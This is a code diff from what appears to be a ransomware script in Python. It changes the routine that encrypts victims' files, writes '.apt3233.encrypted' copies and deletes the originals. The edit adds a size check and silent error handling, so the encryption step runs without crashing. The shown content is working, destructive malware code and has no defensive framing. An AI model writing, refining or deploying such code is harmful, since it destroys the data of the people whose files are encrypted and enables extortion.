@@ -113,19 +113,27 @@ def log_error(e):
             sys.exit(1)
     except Exception:
         pass
-
+        
+def check_file_size(file_path):
+    file_size_origin = os.path.getsize(file_path)
+    file_size_mb = round(file_size_origin /(1024**2), 4)
+    return file_size_mb > 300
+    
 def encrypt_file(file_path):
     encryptedfiles.append(file_path)
+    if check_file_size(file_path):
+        try:
+            with open(file_path, 'rb') as file:
+                file_data = file.read()
+                encrypted_data = cipher_key.encrypt(file_data)
 
-    with open (file_path, 'rb') as file:
-        file_data = file.read()
-        encrypted_data = cipher_key.encrypt(file_data)
+            encrypted_file_path = file_path + '.apt3233.encrypted'
 
-    encrypted_file_path = file_path + '.apt3233.encrypted'
-    with open(encrypted_file_path, 'wb') as file:
-        file.write(encrypted_data)
-    
-    os.remove(file_path)
+            with open(encrypted_file_path, 'wb') as file:
+                file.write(encrypted_data)
+            os.remove(file_path)
+
+        except:pass
 
 def is_encrypted(file_path):
     encrypted_extension = '.apt3233.encrypted'
